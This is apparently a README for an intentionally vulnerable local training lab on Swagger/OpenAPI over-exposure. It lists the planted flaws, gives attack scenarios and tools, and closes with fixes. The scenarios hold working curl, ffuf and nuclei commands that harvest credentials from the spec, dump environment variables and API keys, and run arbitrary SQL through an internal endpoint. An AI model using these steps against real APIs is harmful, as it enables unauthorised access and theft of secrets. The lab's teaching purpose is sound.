# Lab 16 — API Swagger / OpenAPI Excessive Exposure 🔴

**Port:** `8016` | **Stack:** Node.js + MySQL | **Swagger:** `http://localhost:8016/api-docs`  
**Difficulty:** Beginner

---

## 🕳️ Security Loopholes

1. **Credentials in Swagger Description** — Test passwords, DB credentials embedded in spec description
2. **Internal Infrastructure Revealed** — Production/staging hostnames, ports, DB details in `servers` block
3. **Internal & Debug Endpoints Documented** — `/internal/debug`, `/internal/sql` visible to all
4. **Sensitive Schema Fields** — `password_hash`, `ssn`, `internal_notes` in schema definitions
5. **Multiple Swagger Paths** — Served at `/api-docs`, `/swagger.json`, `/openapi.json`, `/v2/api-docs`
6. **`/health` Tech Stack Disclosure** — Leaks Node version, DB host/user, uptime

---

## 🎯 Attack Scenarios

### Scenario A — Full Recon from Swagger Alone
```bash
docker compose up -d

# Open Swagger UI in browser — read description section carefully
open http://localhost:8016/api-docs

# Download spec for offline analysis
curl -s http://localhost:8016/swagger.json | python3 -m json.tool > spec.json

# Extract credentials mentioned in description
grep -i 'password\|secret\|key\|token\|cred' spec.json

# Find all server URLs
python3 -c "
import json
spec = json.load(open('spec.json'))
print('Servers:', [s['url'] for s in spec.get('servers',[])])
print('Paths:', list(spec['paths'].keys()))
"
```

### Scenario B — Hit All Discovered Endpoints
```bash
# From spec, we know these exist
curl http://localhost:8016/health  # Tech stack info
curl http://localhost:8016/internal/debug  # ENV VARS!
curl http://localhost:8016/admin/api-keys  # All API key secrets
curl http://localhost:8016/admin/config  # Internal config including S3 paths

# Scan for all spec paths
nuclei -u http://localhost:8016 -t exposures/apis/swagger-api.yaml
```

### Scenario C — Raw SQL via Internal Endpoint
```bash
# /internal/sql runs arbitrary queries
curl -X POST http://localhost:8016/internal/sql \
  -H "Content-Type: application/json" \
  -d '{"query": "SELECT * FROM api_keys"}'

curl -X POST http://localhost:8016/internal/sql \
  -H "Content-Type: application/json" \
  -d '{"query": "SHOW TABLES"}'

curl -X POST http://localhost:8016/internal/sql \
  -H "Content-Type: application/json" \
  -d '{"query": "SELECT * FROM internal_config"}'
```

### Scenario D — Discover Alternate Swagger Paths
```bash
# Many apps expose spec at multiple paths
for path in /swagger.json /openapi.json /api-docs /v2/api-docs /v3/api-docs /swagger/v2/swagger.json /api/swagger.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8016$path)
  echo "$path → $code"
done

# Automated discovery
ffuf -u http://localhost:8016/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt \
  -mc 200
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| Browser | Read Swagger UI description |
| `nuclei` | `nuclei -u http://localhost:8016 -t exposures/apis/` |
| `ffuf` | Discover swagger paths |
| `swagger-jacker` | Extract and test all swagger endpoints automatically |

---

## 🔐 How to Fix

```javascript
// 1. Disable Swagger entirely in production
if (process.env.NODE_ENV === 'production') {
  // Don't mount swagger at all
} else {
  app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDoc));
}

// 2. Never put credentials in spec descriptions — use separate internal wiki
// 3. Remove internal/debug/admin endpoints from public spec
// 4. Protect even dev Swagger behind auth
app.use('/api-docs', basicAuth({ users: { 'dev': process.env.SWAGGER_PASS } }), swaggerUi.serve, ...);

// 5. Health check should return minimal info
app.get('/health', (req, res) => res.json({ status: 'ok' }));

// 6. Remove /internal/* endpoints entirely from production builds
// 7. Sanitize schema — remove password_hash, ssn from API response schemas
```
